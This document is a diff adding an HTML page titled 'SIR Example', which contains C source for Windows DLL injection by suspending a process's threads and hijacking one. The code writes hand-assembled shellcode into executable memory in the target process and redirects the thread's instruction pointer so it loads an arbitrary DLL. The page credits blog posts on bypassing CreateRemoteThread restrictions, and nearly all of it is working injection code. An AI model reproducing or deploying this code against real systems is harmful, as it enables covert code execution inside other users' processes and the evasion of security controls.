@@ -1,0 +1,140 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>SIR Example</title>
+</head><body>VOID suspendInjectResume(HANDLE hHandle, LPVOID loadLibAddr, LPVOID dllPathAddr) {<br/>
+&nbsp;/*<br/>
+&nbsp; This is a mixture from the following sites:<br/>
+<br/>
+&nbsp; &nbsp;http://syprog.blogspot.com/2012/05/createremotethread-bypass-windows.html<br/>
+&nbsp; &nbsp;http://www.kdsbest.com/?p=159<br/>
+<br/>
+&nbsp;*/<br/>
+<br/>
+&nbsp;HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );<br/>
+&nbsp;HANDLE hSnapshot2 = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );<br/>
+&nbsp;HANDLE thread = NULL;<br/>
+&nbsp;THREADENTRY32 te;<br/>
+&nbsp;THREADENTRY32 te2;<br/>
+&nbsp;<br/>
+&nbsp;CONTEXT &nbsp; ctx;<br/>
+&nbsp;DWORD firstThread = 0;<br/>
+&nbsp;HANDLE targetThread = NULL;<br/>
+<br/>
+&nbsp;LPVOID scAddr;<br/>
+<br/>
+&nbsp;int i;<br/>
+&nbsp;<br/>
+&nbsp;unsigned char sc[] = {<br/>
+&nbsp; &nbsp;// Push all flags<br/>
+&nbsp; &nbsp;0x9C,<br/>
+&nbsp; &nbsp;// Push all register<br/>
+&nbsp; &nbsp;0x60,<br/>
+&nbsp; &nbsp;// Push 3,4,5,6 (dllPathAddr)<br/>
+&nbsp; &nbsp;0x68, 0xAA, 0xAA, 0xAA, 0xAA, <br/>
+&nbsp; &nbsp;// Mov eax, 8,9,10, 11 (loadLibAddr)<br/>
+&nbsp; &nbsp;0xB8, 0xBB, 0xBB, 0xBB, 0xBB,<br/>
+&nbsp; &nbsp;// Call eax<br/>
+&nbsp; &nbsp;0xFF, 0xD0,<br/>
+&nbsp; &nbsp;// Pop all register<br/>
+&nbsp; &nbsp;0x61,<br/>
+&nbsp; &nbsp;// Pop all flags<br/>
+&nbsp; &nbsp;0x9D,<br/>
+&nbsp; &nbsp;// Ret<br/>
+&nbsp; &nbsp;0xC3<br/>
+&nbsp; };<br/>
+<br/>
+&nbsp;te.dwSize = sizeof(THREADENTRY32);<br/>
+&nbsp;te2.dwSize = sizeof(THREADENTRY32);<br/>
+&nbsp;ctx.ContextFlags = CONTEXT_FULL;<br/>
+<br/>
+&nbsp;sc[3] = ((unsigned int) dllPathAddr &amp; 0xFF);<br/>
+&nbsp;sc[4] = (((unsigned int) dllPathAddr &gt;&gt; 8 )&amp; 0xFF);<br/>
+&nbsp;sc[5] = (((unsigned int) dllPathAddr &gt;&gt; 16 )&amp; 0xFF);<br/>
+&nbsp;sc[6] = (((unsigned int) dllPathAddr &gt;&gt; 24 )&amp; 0xFF);<br/>
+<br/>
+&nbsp;sc[8] = ((unsigned int) loadLibAddr &amp; 0xFF);<br/>
+&nbsp;sc[9] = (((unsigned int) loadLibAddr &gt;&gt; 8 )&amp; 0xFF);<br/>
+&nbsp;sc[10] = (((unsigned int) loadLibAddr &gt;&gt; 16 )&amp; 0xFF);<br/>
+&nbsp;sc[11] = (((unsigned int) loadLibAddr &gt;&gt; 24 )&amp; 0xFF);<br/>
+&nbsp;<br/>
+&nbsp;<br/>
+<br/>
+&nbsp;// Suspend Threads<br/>
+&nbsp;if(Thread32First(hSnapshot, &amp;te)) {<br/>
+&nbsp; do {<br/>
+&nbsp; &nbsp;if(te.th32OwnerProcessID == GetProcessId(hHandle)) {<br/>
+&nbsp; &nbsp; if ( firstThread == 0 )<br/>
+&nbsp; &nbsp; &nbsp;firstThread = te.th32ThreadID;<br/>
+&nbsp; &nbsp; thread = OpenThread(THREAD_ALL_ACCESS | THREAD_GET_CONTEXT, FALSE, te.th32ThreadID);<br/>
+&nbsp; &nbsp; if(thread != NULL) {<br/>
+&nbsp; &nbsp; &nbsp;printf("\t[+] Suspending Thread 0x%08x\n", te.th32ThreadID);<br/>
+&nbsp; &nbsp; &nbsp;SuspendThread(thread);<br/>
+&nbsp; &nbsp; &nbsp;CloseHandle(thread);<br/>
+&nbsp; &nbsp; } else {<br/>
+&nbsp; &nbsp; &nbsp;printf("\t[+] Could not open thread!\n");<br/>
+&nbsp; &nbsp; }<br/>
+&nbsp; &nbsp;}<br/>
+&nbsp; } while(Thread32Next(hSnapshot, &amp;te));<br/>
+&nbsp;} else {<br/>
+&nbsp; printf("\t[+] Could not Thread32First! [%d]\n", GetLastError());<br/>
+&nbsp; CloseHandle(hSnapshot);<br/>
+&nbsp; exit(-1);<br/>
+&nbsp;}<br/>
+&nbsp;CloseHandle(hSnapshot);<br/>
+<br/>
+&nbsp;printf("\t[+] Our Launcher Code:\n\t");<br/>
+&nbsp;for (i=0; i&lt;17; i++)<br/>
+&nbsp; printf("%02x ",sc[i]);<br/>
+&nbsp;printf("\n");<br/>
+&nbsp;// &nbsp;Get/Save EIP, Inject<br/>
+&nbsp;printf("\t[+] Targeting Thread 0x%08x\n",firstThread);<br/>
+&nbsp;targetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, firstThread);<br/>
+&nbsp;if (GetThreadContext(targetThread, &amp;ctx) == 0) <br/>
+&nbsp; printf("[!] GetThreadContext Failed!\n");<br/>
+&nbsp;printf("\t[+] Current Registers: \n\t\tEIP[0x%08x] ESP[0x%08x]\n", ctx.Eip, ctx.Esp);<br/>
+<br/>
+&nbsp;printf("\t[+] Saving EIP for our return\n");<br/>
+&nbsp;ctx.Esp -= sizeof(unsigned int);<br/>
+&nbsp;WriteProcessMemory(hHandle, (LPVOID)ctx.Esp, (LPCVOID)&amp;ctx.Eip, sizeof(unsigned int), NULL);<br/>
+&nbsp;printf("\t\tEIP[0x%08x] ESP[0x%08x] EBP[0x%08x]\n", ctx.Eip, ctx.Esp, ctx.Ebp);<br/>
+<br/>
+&nbsp;scAddr = VirtualAllocEx(hHandle, NULL, 17, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br/>
+&nbsp;printf("\t[+] Allocating 17 bytes for our Launcher Code [0x%08x][%d]\n", scAddr, GetLastError());<br/>
+<br/>
+&nbsp;printf ("\t[+] Writing Launcher Code into targetThread [%d]\n", WriteProcessMemory(hHandle, scAddr, (LPCVOID)sc, 17, NULL));<br/>
+<br/>
+&nbsp;printf("\t[+] Setting EIP to LauncherCode\n");<br/>
+&nbsp;ctx.Eip = (DWORD)scAddr;<br/>
+&nbsp;printf("\t\tEIP[0x%08x] ESP[0x%08x]\n", ctx.Eip, ctx.Esp);<br/>
+<br/>
+&nbsp;if (SetThreadContext(targetThread, &amp;ctx) == 0) <br/>
+&nbsp; printf("[!] SetThreadContext Failed!\n");<br/>
+<br/>
+&nbsp;// Resume Threads<br/>
+&nbsp;hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );<br/>
+&nbsp;te.dwSize = sizeof(THREADENTRY32);<br/>
+<br/>
+&nbsp;if(Thread32First(hSnapshot2, &amp;te2)) {<br/>
+&nbsp; do {<br/>
+&nbsp; &nbsp;if(te2.th32OwnerProcessID == GetProcessId(hHandle)) {<br/>
+&nbsp; &nbsp; thread = OpenThread(THREAD_ALL_ACCESS | THREAD_GET_CONTEXT, FALSE, te2.th32ThreadID);<br/>
+&nbsp; &nbsp; if(thread != NULL) {<br/>
+&nbsp; &nbsp; &nbsp;printf("\t[+] Resuming Thread 0x%08x\n", te2.th32ThreadID);<br/>
+&nbsp; &nbsp; &nbsp;ResumeThread(thread);<br/>
+&nbsp; &nbsp; &nbsp;if (te2.th32ThreadID == firstThread) <br/>
+&nbsp; &nbsp; &nbsp; WaitForSingleObject(thread, 5000);<br/>
+&nbsp; &nbsp; &nbsp;CloseHandle(thread);<br/>
+&nbsp; &nbsp; } else {<br/>
+&nbsp; &nbsp; &nbsp;printf("\t[+] Could not open thread!\n");<br/>
+&nbsp; &nbsp; }<br/>
+&nbsp; &nbsp;}<br/>
+&nbsp; } while(Thread32Next(hSnapshot2, &amp;te2));<br/>
+&nbsp;} else {<br/>
+&nbsp; printf("\t[+] Could not Thread32First! [%d]\n", GetLastError());<br/>
+&nbsp; CloseHandle(hSnapshot2);<br/>
+&nbsp; exit(-1);<br/>
+&nbsp;}<br/>
+&nbsp;CloseHandle(hSnapshot2);<br/>
+}</body></html>
